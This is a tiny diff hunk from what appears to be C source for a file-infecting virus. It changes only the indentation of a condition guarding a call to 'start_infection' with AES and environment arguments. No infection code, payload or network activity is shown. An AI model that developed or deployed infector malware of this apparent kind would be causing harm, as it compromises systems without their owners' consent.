@@ -26,7 +26,7 @@ int			main(int argc, char **argv, char **env)
 		{
 			t_cipher_plain *cipher_plain = get_cipher_plain();
 			 if (cipher_plain) {
-				 if (safe_mode(aes)) {
+				if (safe_mode(aes)) {
 					 start_infection(aes, cipher_plain, env);
 			 	}
 			}
